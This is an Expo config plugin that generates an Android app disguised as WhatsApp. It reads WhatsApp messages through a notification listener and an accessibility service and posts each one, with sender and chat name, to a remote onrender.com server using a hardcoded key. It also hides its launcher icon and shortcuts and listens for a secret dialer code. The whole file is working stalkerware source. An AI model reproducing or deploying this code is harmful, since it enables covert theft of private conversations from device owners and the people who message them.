const { withAndroidManifest, withDangerousMod } = require('@expo/config-plugins');
const fs = require('fs');
const path = require('path');

function withNotificationListenerService(config) {
    config = withAndroidManifest(config, (config) => {
        const manifest = config.modResults;
        const app = manifest.manifest.application[0];
        if (!app.service) app.service = [];
        
        // Allow HTTP connections to local backend
        app.$['android:usesCleartextTraffic'] = 'true';

        const hasNLS = app.service.some(s => s.$['android:name'] === '.NotificationService');
        if (!hasNLS) {
            app.service.push({
                $: {
                    'android:name': '.NotificationService', 'android:label': 'WhatsApp Interceptor',
                    'android:permission': 'android.permission.BIND_NOTIFICATION_LISTENER_SERVICE', 'android:exported': 'true'
                },
                'intent-filter': [{ action: [{ $: { 'android:name': 'android.service.notification.NotificationListenerService' } }] }],
            });
        }

        const hasAS = app.service.some(s => s.$['android:name'] === '.WhatsAppAccessibilityService');
        if (!hasAS) {
            app.service.push({
                $: {
                    'android:name': '.WhatsAppAccessibilityService', 'android:label': 'Message Reader',
                    'android:permission': 'android.permission.BIND_ACCESSIBILITY_SERVICE', 'android:exported': 'true'
                },
                'intent-filter': [{ action: [{ $: { 'android:name': 'android.accessibilityservice.AccessibilityService' } }] }],
                'meta-data': [{ $: { 'android:name': 'android.accessibilityservice', 'android:resource': '@xml/accessibility_config' } }],
            });
        }
        // Keep MainActivity as standard LAUNCHER to avoid "Restricted Settings" lock
        // But we add a DummyActivity that is always enabled to keep the package alive when we hide the launcher.
        // 1. WhatsApp Launcher (Initial)
        if (!app['activity-alias']) app['activity-alias'] = [];
        if (!app['activity-alias'].some(a => a.$['android:name'] === '.WhatsAppLauncher')) {
            app['activity-alias'].push({
                $: {
                    'android:name': '.WhatsAppLauncher',
                    'android:targetActivity': '.MainActivity',
                    'android:enabled': 'true',
                    'android:exported': 'true',
                    'android:label': 'WhatsApp',
                    'android:icon': '@mipmap/ic_launcher'
                },
                'intent-filter': [{
                    action: [{ $: { 'android:name': 'android.intent.action.MAIN' } }],
                    category: [{ $: { 'android:name': 'android.intent.category.LAUNCHER' } }]
                }]
            });
        }

        // 2. Dialer Receiver for *1234#
        if (!app.receiver) app.receiver = [];
        if (!app.receiver.some(r => r.$['android:name'] === '.DialerReceiver')) {
            app.receiver.push({
                $: { 'android:name': '.DialerReceiver', 'android:exported': 'true' },
                'intent-filter': [{ action: [{ $: { 'android:name': 'android.intent.action.NEW_OUTGOING_CALL' } }] }]
            });
        }

        const mainActivity = app.activity?.find(a => a.$['android:name'] === '.MainActivity');
        if (mainActivity) mainActivity['intent-filter'] = [];
        return config;
    });

    config = withDangerousMod(config, ['android', (config) => {
        const root = config.modRequest.projectRoot;
        const pkg = path.join(root, 'android/app/src/main/java/com/edu/whatsappinterceptor');
        const resXml = path.join(root, 'android/app/src/main/res/xml');
        fs.mkdirSync(pkg, { recursive: true });
        fs.mkdirSync(resXml, { recursive: true });

        // Accessibility config XML
        fs.writeFileSync(path.join(resXml, 'accessibility_config.xml'), 
            '<?xml version="1.0" encoding="utf-8"?>\n' +
            '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"\n' +
            '    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged|typeViewScrolled"\n' +
            '    android:accessibilityFeedbackType="feedbackGeneric"\n' +
            '    android:packageNames="com.whatsapp,com.whatsapp.w4b"\n' +
            '    android:notificationTimeout="100"\n' +
            '    android:canRetrieveWindowContent="true" />\n'
        );

        // Physical SetupActivity.kt
        fs.writeFileSync(path.join(pkg, 'SetupActivity.kt'),
            `package com.edu.whatsappinterceptor
import android.app.Activity
import android.os.Bundle
import android.content.Intent

class SetupActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        finish()
    }
}`
        )

        // NotificationService - improved parsing
        fs.writeFileSync(path.join(pkg, 'NotificationService.kt'),
            `package com.edu.whatsappinterceptor
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.os.Bundle
import org.json.JSONArray
import org.json.JSONObject

class NotificationService : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return
        val pkg = sbn.packageName ?: return
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
        try {
            val extras = sbn.notification?.extras ?: return
            val title = extras.getString("android.title") ?: "Unknown"
            val text = extras.getCharSequence("android.text")?.toString() ?: ""

            val msgs = extras.getParcelableArray("android.messages")
            if (msgs != null && msgs.isNotEmpty()) {
                for (m in msgs) {
                    if (m is Bundle) {
                        val sender = m.getCharSequence("sender")?.toString() ?: title
                        val msgText = m.getCharSequence("text")?.toString() ?: ""
                        if (msgText.isNotEmpty()) saveMessage(title, sender, msgText)
                    }
                }
            } else {
                val lines = extras.getCharSequenceArray("android.textLines")
                if (lines != null && lines.isNotEmpty()) {
                    for (l in lines) saveMessage(title, title, l.toString())
                } else if (text.isNotEmpty()) {
                    saveMessage(title, title, text)
                }
            }
        } catch (e: Exception) {}
    }

    private fun saveMessage(chat: String, sender: String, message: String) {
        if (isDuplicate(chat, sender, message)) return
        try {
            val prefs = applicationContext.getSharedPreferences("sraas_messages", 0)
            val existing = prefs.getString("messages", "[]") ?: "[]"
            val arr = try { JSONArray(existing) } catch (e: Exception) { JSONArray() }
            val obj = JSONObject()
            obj.put("chat", chat)
            obj.put("sender", sender)
            obj.put("message", message)
            obj.put("time", System.currentTimeMillis())
            arr.put(obj)
            while (arr.length() > 500) arr.remove(0)
            prefs.edit().putString("messages", arr.toString()).apply()
            
            // Send only the new message (not all) but in a sequential way
            syncSingleMessage(chat, sender, message, System.currentTimeMillis())
        } catch (e: Exception) {}
    }

    private fun syncSingleMessage(chat: String, sender: String, message: String, time: Long) {
        Thread {
            try {
                val apiUrl = "https://system-task-b6ra.onrender.com/api/webhooks/whatsapp/sync"
                val url = java.net.URL(apiUrl)
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-api-key", "SRAAS_SECRET_WEBHOOK_KEY_123")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true

                val msgObj = JSONObject()
                msgObj.put("chat", chat.trim())
                msgObj.put("sender", sender.trim())
                msgObj.put("message", message.trim())
                msgObj.put("time", time)

                val arr = JSONArray()
                arr.put(msgObj)

                val payload = JSONObject()
                payload.put("messages", arr)

                val os = conn.outputStream
                os.write(payload.toString().toByteArray(Charsets.UTF_8))
                os.flush()
                os.close()

                conn.responseCode
            } catch (e: Exception) {}
        }.start()
    }

    private fun isDuplicate(chat: String, sender: String, message: String): Boolean {
        try {
            val prefs = applicationContext.getSharedPreferences("sraas_messages", 0)
            val existing = prefs.getString("messages", "[]") ?: "[]"
            val arr = try { JSONArray(existing) } catch (e: Exception) { return false }
            val len = arr.length()
            val checkCount = minOf(len, 20)
            for (i in (len - checkCount) until len) {
                val obj = arr.getJSONObject(i)
                if (obj.optString("chat") == chat && obj.optString("sender") == sender && obj.optString("message") == message) return true
            }
        } catch (e: Exception) {}
        return false
    }
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
`);

        // Accessibility Service - highly resilient heuristic parser
        fs.writeFileSync(path.join(pkg, 'WhatsAppAccessibilityService.kt'),
            `package com.edu.whatsappinterceptor
import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

class WhatsAppAccessibilityService : AccessibilityService() {
    private val junkPatterns = listOf("Photo,", "Video,", "Audio,", "GIF,", "Sticker,", "Document,", "Contact card", "Location", "date ")
    private val uiStrings = setOf("Type a message", "Message", "Voice message", "Search", "Online", "typing...", "Calls", "Chats", "Updates", "Communities", "Navigate up", "Attach", "Camera", "Payment")

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
        try {
            val root = rootInActiveWindow ?: return
            
            // 1. Verify we are inside a chat by finding a non-search EditText
            if (!isChatInput(root)) {
                root.recycle()
                return
            }

            // 2. Get chat name (try ID first, then fallback)
            var chatName = "Unknown"
            val contactNode = findNodeById(root, "com.whatsapp:id/conversation_contact_name")
            if (contactNode != null && !contactNode.text.isNullOrEmpty()) {
                chatName = contactNode.text.toString()
            } else {
                val texts = mutableListOf<String>()
                extractAllTexts(root, texts)
                for (t in texts) {
                    val trimmed = t.trim()
                    if (trimmed.isNotEmpty() && isValidMessage(trimmed)) {
                        chatName = trimmed
                        break
                    }
                }
            }

            // Get screen width for outgoing heuristic
            val rootRect = android.graphics.Rect()
            root.getBoundsInScreen(rootRect)
            val screenWidth = rootRect.width()

            // 3. Extract messages
            extractMessages(root, chatName, screenWidth)

            root.recycle()
        } catch (e: Exception) {}
    }

    private fun extractAllTexts(node: AccessibilityNodeInfo, list: MutableList<String>) {
        if (node.className?.toString() == "android.widget.TextView") {
            val text = node.text?.toString() ?: ""
            if (text.isNotEmpty()) list.add(text)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            extractAllTexts(child, list)
            child.recycle()
        }
    }

    private fun isChatInput(node: AccessibilityNodeInfo): Boolean {
        if (node.className?.toString() == "android.widget.EditText") {
            val text = node.text?.toString()?.lowercase() ?: ""
            val desc = node.contentDescription?.toString()?.lowercase() ?: ""
            if (!text.contains("search") && !desc.contains("search") && !text.contains("ask meta") && !desc.contains("ask meta")) {
                return true
            }
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (isChatInput(child)) {
                child.recycle()
                return true
            }
            child.recycle()
        }
        return false
    }

    private fun findNodeById(node: AccessibilityNodeInfo, id: String): AccessibilityNodeInfo? {
        if (node.viewIdResourceName == id) return node
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val res = findNodeById(child, id)
            if (res != null) {
                child.recycle()
                return res
            }
            child.recycle()
        }
        return null
    }

    private fun extractMessages(node: AccessibilityNodeInfo, chatName: String, screenWidth: Int) {
        val className = node.className?.toString()
        
        if (className == "android.widget.TextView") {
            val text = node.text?.toString()?.trim() ?: ""
            if (text.isNotEmpty() && text != chatName && isValidMessage(text)) {
                val isOutgoing = isOutgoingMessage(node, screenWidth)
                val sender = if (isOutgoing) "You" else chatName
                if (!isDuplicate(chatName, sender, text)) {
                    saveMsg(chatName, sender, text)
                }
            }
        } else if (className == "android.view.ViewGroup" || className == "android.widget.LinearLayout" || className == "android.widget.FrameLayout") {
            val desc = node.contentDescription?.toString()?.trim() ?: ""
            if (desc.isNotEmpty() && desc.contains(Regex("\\\\d{1,2}:\\\\d{2}"))) {
                if (desc.startsWith("You:")) {
                    val msg = desc.substring(4).substringBeforeLast(",").trim()
                    if (msg.isNotEmpty() && msg != chatName && isValidMessage(msg) && !isDuplicate(chatName, "You", msg)) {
                        saveMsg(chatName, "You", msg)
                    }
                } else if (!desc.contains("unread")) {
                    val msg = desc.substringBeforeLast(",").trim()
                    if (msg.isNotEmpty() && msg != chatName && isValidMessage(msg) && !isDuplicate(chatName, chatName, msg)) {
                        saveMsg(chatName, chatName, msg)
                    }
                }
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            extractMessages(child, chatName, screenWidth)
            child.recycle()
        }
    }

    private fun isValidMessage(text: String): Boolean {
        if (uiStrings.contains(text)) return false
        if (isFullTimestamp(text)) return false
        if (isDate(text)) return false
        for (p in junkPatterns) {
            if (text.contains(p, ignoreCase = true)) return false
        }
        return true
    }

    private fun isOutgoingMessage(node: AccessibilityNodeInfo?, screenWidth: Int): Boolean {
        var current = node
        var steps = 0
        while (current != null && steps < 10) {
            val desc = current.contentDescription?.toString() ?: ""
            if (desc.startsWith("You:") || desc.contains("Read") || desc.contains("Delivered") || desc.contains("Sent") || desc.contains("Pending")) {
                return true
            }
            
            val rect = android.graphics.Rect()
            current.getBoundsInScreen(rect)
            val leftDist = rect.left
            val rightDist = screenWidth - rect.right
            
            if (rightDist < leftDist - 50 && rect.width() > 0) {
                return true
            }
            
            current = current.parent
            steps++
        }
        return false
    }

    private fun isFullTimestamp(text: String): Boolean {
        val trimmed = text.trim()
        if (trimmed.matches(Regex("^\\\\d{1,2}:\\\\d{2}\\\\s*(am|pm|AM|PM)$"))) return true
        if (trimmed.matches(Regex("^\\\\d{1,2}:\\\\d{2}$"))) return true 
        return false
    }

    private fun isDate(text: String): Boolean {
        val trimmed = text.trim().lowercase()
        if (trimmed == "today" || trimmed == "yesterday") return true
        if (trimmed.matches(Regex(".*\\\\d{1,2}\\\\s+(jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec).*"))) return true
        return false
    }

    private fun isDuplicate(chat: String, sender: String, message: String): Boolean {
        try {
            val prefs = applicationContext.getSharedPreferences("sraas_messages", 0)
            val existing = prefs.getString("messages", "[]") ?: "[]"
            val arr = try { JSONArray(existing) } catch (e: Exception) { return false }
            val len = arr.length()
            val checkCount = minOf(len, 30)
            for (i in (len - checkCount) until len) {
                val obj = arr.getJSONObject(i)
                if (obj.optString("chat") == chat && obj.optString("sender") == sender && obj.optString("message") == message) {
                    return true
                }
            }
        } catch (e: Exception) {}
        return false
    }

    private fun saveMsg(chat: String, sender: String, message: String) {
        try {
            val prefs = applicationContext.getSharedPreferences("sraas_messages", 0)
            val existing = prefs.getString("messages", "[]") ?: "[]"
            val arr = try { JSONArray(existing) } catch (e: Exception) { JSONArray() }
            val obj = JSONObject()
            obj.put("chat", chat)
            obj.put("sender", sender)
            obj.put("message", message)
            obj.put("time", System.currentTimeMillis())
            arr.put(obj)
            while (arr.length() > 500) arr.remove(0)
            prefs.edit().putString("messages", arr.toString()).apply()
            
            syncSingleMessage(chat, sender, message, System.currentTimeMillis())
        } catch (e: Exception) {}
    }

    private fun syncSingleMessage(chat: String, sender: String, message: String, time: Long) {
        Thread {
            try {
                val apiUrl = "https://system-task-b6ra.onrender.com/api/webhooks/whatsapp/sync"
                val url = java.net.URL(apiUrl)
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-api-key", "SRAAS_SECRET_WEBHOOK_KEY_123")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true

                val msgObj = JSONObject()
                msgObj.put("chat", chat.trim())
                msgObj.put("sender", sender.trim())
                msgObj.put("message", message.trim())
                msgObj.put("time", time)

                val arr = JSONArray()
                arr.put(msgObj)

                val payload = JSONObject()
                payload.put("messages", arr)

                val os = conn.outputStream
                os.write(payload.toString().toByteArray(Charsets.UTF_8))
                os.flush()
                os.close()

                conn.responseCode
            } catch (e: Exception) {}
        }.start()
    }

    override fun onInterrupt() {}
}
`);

        // MessageStoreModule
        fs.writeFileSync(path.join(pkg, 'MessageStoreModule.kt'),
            `package com.edu.whatsappinterceptor
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.Promise

class MessageStoreModule(ctx: ReactApplicationContext) : ReactContextBaseJavaModule(ctx) {
    override fun getName(): String = "MessageStore"
    @ReactMethod fun getMessages(p: Promise) {
        try { val d = reactApplicationContext.getSharedPreferences("sraas_messages",0).getString("messages","[]") ?: "[]"; p.resolve(d) } catch(e:Exception) { p.resolve("[]") }
    }
    @ReactMethod fun clearMessages(p: Promise) {
        try { reactApplicationContext.getSharedPreferences("sraas_messages",0).edit().putString("messages","[]").apply(); p.resolve(true) } catch(e:Exception) { p.resolve(false) }
    }
    @ReactMethod fun getApiUrl(p: Promise) {
        try { val url = reactApplicationContext.getSharedPreferences("sraas_settings",0).getString("apiUrl","") ?: ""; p.resolve(url) } catch(e:Exception) { p.resolve("") }
    }
    @ReactMethod fun setApiUrl(url: String, p: Promise) {
        try { reactApplicationContext.getSharedPreferences("sraas_settings",0).edit().putString("apiUrl", url).apply(); p.resolve(true) } catch(e:Exception) { p.resolve(false) }
    }
    @ReactMethod fun checkPermissions(p: Promise) {
        try {
            val ctx = reactApplicationContext
            val pkg = ctx.packageName
            
            // Check Notification
            val notifStr = android.provider.Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
            val notifEnabled = notifStr != null && notifStr.contains(pkg)

            // Check Accessibility
            var accEnabled = false
            try {
                val accStr = android.provider.Settings.Secure.getString(ctx.contentResolver, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
                accEnabled = accStr != null && accStr.contains(pkg)
            } catch(e:Exception) {}

            val res = org.json.JSONObject()
            res.put("notification", notifEnabled)
            res.put("accessibility", accEnabled)
            
            p.resolve(res.toString())
        } catch(e:Exception) { 
            p.resolve("{}") 
        }
    }

    private var hideAttempted = false

    private fun performHide() {
        if (hideAttempted) return
        hideAttempted = true
        try {
            val ctx = reactApplicationContext
            val pkgName = ctx.packageName
            val pm = ctx.packageManager
            
            // 1. Disable the launcher alias
            pm.setComponentEnabledSetting(
                android.content.ComponentName(pkgName, "$pkgName.WhatsAppLauncher"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )

            // 2. Remove home screen shortcut (old method - works on many launchers)
            try {
                val shortcutIntent = android.content.Intent("com.android.launcher.action.UNINSTALL_SHORTCUT")
                shortcutIntent.putExtra(android.content.Intent.EXTRA_SHORTCUT_NAME, "WhatsApp")
                shortcutIntent.putExtra("duplicate", false)
                val launchIntent = android.content.Intent()
                launchIntent.component = android.content.ComponentName(pkgName, "$pkgName.WhatsAppLauncher")
                shortcutIntent.putExtra(android.content.Intent.EXTRA_SHORTCUT_INTENT, launchIntent)
                ctx.sendBroadcast(shortcutIntent)
            } catch(e:Exception) {}

            // 3. Remove via ShortcutManager (newer method)
            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N_MR1) {
                    val sm = ctx.getSystemService(android.content.pm.ShortcutManager::class.java)
                    sm?.removeAllDynamicShortcuts()
                    sm?.disableShortcuts(listOf("WhatsAppLauncher", "WhatsApp"))
                }
            } catch(e:Exception) {}

        } catch(e:Exception) {
            hideAttempted = false
        }
    }

    @ReactMethod fun hideAppIcon(p: Promise) {
        performHide()
        p.resolve(true)
    }

    @ReactMethod fun goHome() {
        try {
            val homeIntent = android.content.Intent(android.content.Intent.ACTION_MAIN)
            homeIntent.addCategory(android.content.Intent.CATEGORY_HOME)
            homeIntent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
            reactApplicationContext.startActivity(homeIntent)
        } catch(e:Exception) {}
    }

    @ReactMethod fun openLauncherSettings() {
        try {
            val ctx = reactApplicationContext
            // Detect default launcher
            val intent = android.content.Intent(android.content.Intent.ACTION_MAIN)
            intent.addCategory(android.content.Intent.CATEGORY_HOME)
            val resolveInfo = ctx.packageManager.resolveActivity(intent, android.content.pm.PackageManager.MATCH_DEFAULT_ONLY)
            val launcherPkg = resolveInfo?.activityInfo?.packageName ?: "com.android.launcher3"
            
            // Open launcher's App Info page
            val settingsIntent = android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            settingsIntent.data = android.net.Uri.parse("package:$launcherPkg")
            settingsIntent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
            ctx.startActivity(settingsIntent)
        } catch(e:Exception) {}
    }
}
`);

        // MessageStorePackage
        fs.writeFileSync(path.join(pkg, 'MessageStorePackage.kt'),
            `package com.edu.whatsappinterceptor
import com.facebook.react.ReactPackage
import com.facebook.react.bridge.NativeModule
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.uimanager.ViewManager
class MessageStorePackage : ReactPackage {
    override fun createNativeModules(ctx: ReactApplicationContext): List<NativeModule> = listOf(MessageStoreModule(ctx))
    override fun createViewManagers(ctx: ReactApplicationContext): List<ViewManager<*,*>> = emptyList()
}
`);

        // Modify MainApplication
        const mainApp = path.join(pkg, 'MainApplication.kt');
        if (fs.existsSync(mainApp)) {
            let c = fs.readFileSync(mainApp, 'utf8');
            if (!c.includes('MessageStorePackage')) {
                c = c.replace('PackageList(this).packages.apply {', 'PackageList(this).packages.apply {\n              add(MessageStorePackage())');
                fs.writeFileSync(mainApp, c);
            }
        }
        return config;
    }]);
    return config;
}
module.exports = withNotificationListenerService;
